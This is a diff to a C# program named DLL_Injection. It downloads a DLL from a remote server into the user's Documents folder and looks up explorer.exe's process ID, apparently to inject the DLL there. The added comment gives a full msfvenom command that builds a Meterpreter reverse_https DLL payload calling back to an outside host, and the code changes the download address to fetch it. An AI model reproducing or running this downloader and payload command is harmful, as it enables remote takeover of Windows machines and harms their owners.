@@ -32,10 +32,11 @@ namespace DLL_Injection
         static void Main(string[] args)
         {
             //download the DLL from a remote webserver, in this case: http://192.168.1.1/, then the DLL gets written to disk specified in the dllName variable
+            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 enablestageencoding=true handlersslcert=justice.pem prependmigrate=true -f dll -o met.dll
             String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
             String dllName = dir + "\\met.dll";
             WebClient wc = new WebClient();
-            wc.DownloadFile("http://192.168.45.5/met.dll", dllName);
+            wc.DownloadFile("http://192.168.1.1/met.dll", dllName);
 
             Process[] expProc = Process.GetProcessesByName("explorer");
             int pid = expProc[0].Id;
